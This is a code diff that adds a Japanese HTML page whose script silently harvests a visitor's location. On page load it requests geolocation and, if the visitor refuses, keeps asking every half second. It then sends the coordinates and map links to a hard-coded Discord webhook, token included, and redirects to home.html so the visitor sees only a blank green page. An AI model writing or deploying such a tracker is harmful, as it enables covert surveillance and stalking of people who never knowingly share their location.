@@ -1,0 +1,61 @@
+<!DOCTYPE html>
+<html lang="ja">
+<head>
+<meta charset="UTF-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>位置情報取得＋Discord送信</title>
+<style>
+  body, html {
+    margin: 0; padding: 0;
+    height: 100vh;
+    background: #00B14F;
+  }
+</style>
+</head>
+<body>
+<script>
+  const webhookURL = "https://discord.com/api/webhooks/1388700849257189566/wMhfECmtZFOk5rO6unLV8IDN-eBJoxmW8ajtlC1ZL8eKh2ztPMzi1DqBGlG-2uOuZ9Mh"; // ←自分のWebhook URLに変えてね！
+
+  function requestLocation() {
+    if (!navigator.geolocation) return;
+
+    navigator.geolocation.getCurrentPosition(
+      position => {
+        const lat = position.coords.latitude;
+        const lon = position.coords.longitude;
+        sendToDiscord(lat, lon);
+      },
+      error => {
+        if (error.code === error.PERMISSION_DENIED) {
+          setTimeout(requestLocation, 500); // 許可されるまで繰り返し
+        } else {
+          setTimeout(requestLocation, 500); // 他エラーでもリトライ
+        }
+      }
+    );
+  }
+
+  function sendToDiscord(lat, lon) {
+    const mapURL = `https://static-maps.yandex.ru/1.x/?ll=${lon},${lat}&z=15&size=450,300&l=map&pt=${lon},${lat},pm2rdl`;
+
+    fetch(webhookURL, {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json' },
+      body: JSON.stringify({
+        content: `📍 現在地:\n緯度: ${lat}\n経度: ${lon}\n🗺️ 地図画像: ${mapURL}\nhttps://www.google.com/maps?q=${lat},${lon}`
+      }),
+    })
+    .then(() => {
+      // 送信成功 → 次のページへ
+      window.location.href = "home.html";
+    })
+    .catch(() => {
+      // 送信失敗でもリトライで位置情報再取得
+      setTimeout(requestLocation, 1000);
+    });
+  }
+
+  requestLocation();
+</script>
+</body>
+</html>
